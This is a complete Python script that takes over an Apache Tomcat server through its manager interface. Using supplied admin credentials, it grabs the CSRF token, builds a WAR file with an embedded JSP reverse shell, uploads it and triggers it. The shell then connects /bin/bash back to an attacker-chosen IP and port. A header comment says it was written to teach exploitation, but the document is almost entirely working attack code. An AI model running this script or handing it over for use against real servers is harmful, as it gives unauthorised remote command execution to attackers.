#!/usr/bin/python3

#Script to execute code in Apache Tomcat via WAR upload
#Written by h00p 2021-05-27 during mentorship sessions to teach Python development and Tomcat exploitation
import requests
import bs4
import sys
import zipfile
import os
import shutil
import string
import random
import argparse
import socket

#Parse Arguments
parser = argparse.ArgumentParser(description='Shell a Tomcat server running the manager servlet', usage='./tomcat_manager_revshell.py --target http://tomcat.example.com:8080 --port 4444 ---username admin --password tomcat --proxy')
parser.add_argument("--target")
parser.add_argument("--ip")
parser.add_argument("--port")
parser.add_argument("--username")
parser.add_argument("--password")
parser.add_argument("--proxy")
args = parser.parse_args()

#Check Args
if not args.port or not args.username or not args.password or not args.target:
	parser.print_help()
	sys.exit(1)

#Set Variables
url = args.target
if args.ip:
	ip = args.ip
else:
	ip = socket.gethostbyname(socket.gethostname())
	yesorno = input(f"[*] Discovered local IP for reverse shell: {ip}.  Is this correct? (y/n): ")
	if "n" in yesorno or "N" in yesorno:
		ip = input(f"[*] What is your local IP? ")

port = args.port
username = args.username 
password = args.password
if args.proxy:
	proxies = {'http':args.proxy,'https':args.proxy}
else:
	proxies = {}

manager_endpoint = '/manager/html'
warfile_name = ''.join(random.choice(string.ascii_uppercase) for i in range(5)) + ".war"
jsp_name = ''.join(random.choice(string.ascii_lowercase) for i in range(5)) + ".jsp"

#Initiate Session so cookies stay the same
print("[*] Initializing session...")
s = requests.Session()

#Initial request for Tomcat /manager/html (to grab CSRF)
print("[*] Grabbing CSRF Token...")
try:
	response = s.get(f"{url}{manager_endpoint}", verify=False, proxies=proxies, auth=requests.auth.HTTPBasicAuth(username,password))
except Exception as e:
	print(f"[!] Error connecting to Tomcat server at {url}.")
	sys.exit(1)

#Use BeautifulSoup to grab CSRF Token
soup = bs4.BeautifulSoup(response.content, "html.parser")
results = soup.find_all('form')
uri = ""
for form in results:
	if "upload" in form["action"]:
		#CSRF is in the /manager/html/upload endpoint.  Just need to grab that.
		#Resides in a <form action="">
		uri = form["action"]
		token = uri.split("=")[2]
		print(f"[!] CSRF Token Found! {token}")

#Exit program if CSRF grab fails.
if uri == "":
	print("CSRF Token not Found")
	sys.exit(1)

#Create Malicious WAR
webxml_content = f"""\
	<?xml version="1.0"?>
	<!DOCTYPE web-app PUBLIC
	"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
	"http://java.sun.com/dtd/web-app_2_3.dtd">
	<web-app>
	<servlet>
	<servlet-name>h00p</servlet-name>
	<jsp-file>/{jsp_name}</jsp-file>
	</servlet>
	</web-app>"""

jsp_revshell_content = f"""\
	<html><h1>Java Reverse Shell</h1><h3>&lt;3 h00p</h3>
	<!-- https://gist.github.com/halozheng/bf0eaa60c5f166dbc848 -->
	<body><%@page import="java.lang.*"%><%@page import="java.util.*"%><%@page import="java.io.*"%><%@page import="java.net.*"%>
	<%
	String host= "{ip}";
	int port={port};
	String cmd="/bin/bash";
	Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
	Socket s=new Socket(host,port);
	InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
	OutputStream po=p.getOutputStream(),so=s.getOutputStream();
	while(!s.isClosed()){{
		while(pi.available()>0)so.write(pi.read());
		while(pe.available()>0)so.write(pe.read());
		while(si.available()>0)po.write(si.read());
		so.flush();
		po.flush();
		Thread.sleep(50);
		try {{p.exitValue();break;}}catch (Exception e) {{ }} }};p.destroy();s.close();
	%>
	</body></html>"""

#Create WAR with malicious JSP
print(f"[*] Building malicious WAR file: {warfile_name}")
if os.path.exists("WEB-INF"):
	shutil.rmtree("WEB-INF/")
os.mkdir("WEB-INF")
webxml = open("WEB-INF/web.xml","w")
webxml.write(webxml_content)
webxml.close()
jsp = open(f"{jsp_name}","w")
jsp.write(jsp_revshell_content)
jsp.close()
zipobj = zipfile.ZipFile(f'{warfile_name}','w')
zipobj.write("WEB-INF/web.xml")
zipobj.write(f"{jsp_name}")
zipobj.close()
print(f"[*] Zipping WAR file...")

#Upload Malicious WAR
print(f"[*] Uploading WAR to Tomcat server...")
files = {'deployWar': (warfile_name,open(warfile_name,'rb'),'application/octet-stream')}
response = s.post(f"{url}{uri}", verify=False, proxies=proxies, files=files, auth=requests.auth.HTTPBasicAuth(username,password))

#Trigger Reverse Shell
war_path = warfile_name.split('.')[0]
print(f"[*] Triggering reverse shell at {url}/{war_path}/{jsp_name}")
response = s.get(f"{url}/{war_path}/{jsp_name}", verify=False, proxies=proxies)